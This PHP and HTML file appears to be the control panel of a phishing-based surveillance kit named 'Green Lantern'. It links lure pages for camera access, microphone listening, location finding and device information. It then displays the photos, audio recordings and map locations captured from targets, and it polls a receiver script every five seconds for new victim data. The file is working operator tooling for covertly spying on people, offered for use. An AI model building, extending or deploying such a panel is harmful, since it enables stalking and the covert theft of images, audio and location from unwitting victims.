<?php
session_start();
include "./assets/components/login-arc.php";

if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }
}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);
}
else {
    header('location: login.php');
    exit;
}

// Load logs
$imageLog = file_exists('images/image.log') ? file('images/image.log', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
$soundLog = file_exists('sounds/sounds.log') ? file('sounds/sounds.log', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];

// Parse logs for images
$images = [];
foreach ($imageLog as $line) {
    if (strpos($line, 'Image File Was Saved') !== false) {
        preg_match('/\/images\/[^\s]+\.png/', $line, $match);
        if ($match) {
            // Adjust the path to match the actual directory
            $imagePath = '../green-lantern/image/' . basename($match[0]);
            if (file_exists($imagePath)) {
                $images[] = $imagePath;
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Green Lantern - Control Hub</title>
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: #0d0d0d;
            font-family: 'Courier New', monospace;
            color: #00ff00;
            overflow-x: hidden;
        }

        .container {
            margin-top: 20px;
        }

        .terminal-box {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            box-shadow: 0 0 10px #00ff00;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
        }

        .log-area {
            background: #0d0d0d;
            border: 1px solid #00ff00;
            color: #00ff00;
            height: 200px;
            resize: none;
            font-family: 'Courier New', monospace;
            width: 100%;
        }

        .btn-hacker {
            background: #00ff00;
            color: #0d0d0d;
            border: none;
            text-transform: uppercase;
            transition: all 0.3s;
            font-weight: bold;
            margin: 5px;
        }

        .btn-hacker:hover {
            background: #00cc00;
            box-shadow: 0 0 10px #00ff00;
        }

        .btn-danger {
            background: #ff4444;
        }

        .btn-danger:hover {
            background: #cc3333;
            box-shadow: 0 0 10px #ff4444;
        }

        #map {
            height: 300px;
            width: 100%;
            border: 1px solid #00ff00;
            margin-top: 20px;
        }

        .media-section img {
            max-width: 200px;
            border: 1px solid #00ff00;
            margin: 10px;
            display: inline-block;
        }

        .audio-section audio {
            width: 100%;
            margin-top: 10px;
        }

        canvas {
            position: fixed;
            top: 0;
            left: 0;
            z-index: -1;
            opacity: 0.1;
        }

        .section-title {
            color: #00ff00;
            text-transform: uppercase;
            text-shadow: 0 0 5px #00ff00;
            margin-bottom: 15px;
        }

        .template-links {
            margin: 10px 0;
        }

        .template-links a {
            color: #00ff00;
            text-decoration: none;
            margin-right: 10px;
        }

        .template-links a:hover {
            text-decoration: underline;
            text-shadow: 0 0 5px #00ff00;
        }

        .branding {
            text-align: center;
            margin: 20px 0;
            color: #00ff00;
            text-shadow: 0 0 5px #00ff00;
        }

        .branding .main-title {
            font-size: 36px;
            text-transform: uppercase;
        }

        .branding .sub-title {
            font-size: 14px;
            text-transform: lowercase;
            margin-top: -10px;
        }
    </style>
</head>

<body>
    <canvas id="matrix"></canvas>

    <div class="container">
        <!-- Branding -->
        <div class="branding">
            <div class="main-title">Green Lantern</div>
            <div class="sub-title">by abhisecurity</div>
        </div>

        <!-- Template Links -->
        <div class="terminal-box template-links">
            <?php
            $templates = [
                'Access Camera' => 'templates/camera_temp/index.html',
                'Listen anyone' => 'templates/microphone/index.html',
                'Find Near you' => 'templates/nearyou/index.html',
                'System Info' => 'templates/normal_data/index.html',
                'weather' => 'templates/weather/index.html'
            ];
            foreach ($templates as $name => $url) {
                echo "<a href='$url' target='_blank'>$name</a>";
            }
            ?>
        </div>

        <!-- Logs Section -->
        <div class="terminal-box">
            <h3 class="section-title">System Logs</h3>
            <textarea class="log-area" id="result"><?php
                echo "> [".date('Y-m-d H:i:s')."] Panel Initialized\n";
                foreach ($imageLog as $line) echo "> $line\n";
                foreach ($soundLog as $line) echo "> $line\n";
            ?></textarea>
            <div class="d-flex justify-content-center mt-3">
                <button class="btn btn-danger btn-hacker" id="btn-listen">Listener Running / Stop</button>
                <button class="btn btn-hacker" onclick="saveTextAsFile(result.value,'log.txt')">Download Logs</button>
                <button class="btn btn-warning btn-hacker" id="btn-clear">Clear Logs</button>
            </div>
        </div>

        <!-- Captured Images Section -->
        <div class="terminal-box media-section">
            <h3 class="section-title">Captured Visuals</h3>
            <div id="image-gallery">
                <?php
                foreach ($images as $imagePath) {
                    // Convert to a web-accessible path (assuming the web server root is at green-lantern/)
                    $webPath = '/images/' . basename($imagePath);
                    echo "<img src='$webPath' alt='Captured Image'>";
                }
                ?>
            </div>
        </div>

        <!-- Location Map Section -->
        <div class="terminal-box">
            <h3 class="section-title">Target Location</h3>
            <div id="map"></div>
        </div>

        <!-- Audio Playback Section -->
        <div class="terminal-box audio-section">
            <h3 class="section-title">Audio Intelligence</h3>
            <audio controls id="audio-player">
                <source id="audio-source" src="" type="audio/mpeg">
                Your browser does not support the audio element.
            </audio>
            <?php
            if (!empty($soundLog)) {
                $firstAudio = filter_var($soundLog[0], FILTER_VALIDATE_URL) ? $soundLog[0] : '';
                echo "<script>document.getElementById('audio-source').src = '$firstAudio'; document.getElementById('audio-player').load();</script>";
            }
            ?>
        </div>

        <div class="text-center" style="color: #00ff00; font-size: 12px;">
            Powered by AbhiSecurity Group
        </div>
    </div>

    <!-- Scripts -->
    <script src="./assets/js/jquery.min.js"></script>
    <script src="./assets/js/script.js"></script>
    <script src="./assets/js/sweetalert2.min.js"></script>
    <script src="./assets/js/growl-notification.min.js"></script>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />

    <script>
        // Matrix effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = [];
        for(let x = 0; x < columns; x++) drops[x] = 1;

        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff00';
            ctx.font = fontSize + 'px monospace';
            for(let i = 0; i < drops.length; i++) {
                const text = letters.charAt(Math.floor(Math.random() * letters.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975)
                    drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 33);

        // Map initialization
        const map = L.map('map').setView([51.505, -0.09], 13);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: 'Map data © OpenStreetMap contributors'
        }).addTo(map);

        // Update location (replace with actual data from logs)
        function updateLocation(lat, lon) {
            map.setView([lat, lon], 13);
            L.marker([lat, lon]).addTo(map);
        }

        // Save text as file
        function saveTextAsFile(textToWrite, fileName) {
            const textFileAsBlob = new Blob([textToWrite], {type:'text/plain'});
            const downloadLink = document.createElement("a");
            downloadLink.download = fileName;
            downloadLink.href = window.URL.createObjectURL(textFileAsBlob);
            downloadLink.click();
        }

        // Clear logs
        $('#btn-clear').click(function() {
            $('#result').val('');
        });

        // Simulate dynamic updates (replace with real data fetching)
        $(document).ready(function() {
            // Example: Check for new location or audio
            setInterval(function() {
                $.get('receiver.php', function(data) {
                    if (data.location) updateLocation(data.location.lat, data.location.lon);
                    if (data.image) $('#image-gallery').append(`<img src="${data.image}" alt="Captured Image">`);
                    if (data.audio) {
                        $('#audio-source').attr('src', data.audio);
                        $('#audio-player')[0].load();
                    }
                    $('#result').val($('#result').val() + '\n> [' + new Date().toLocaleString() + '] New data received');
                });
            }, 5000); // Check every 5 seconds
        });
    </script>
</body>
</html>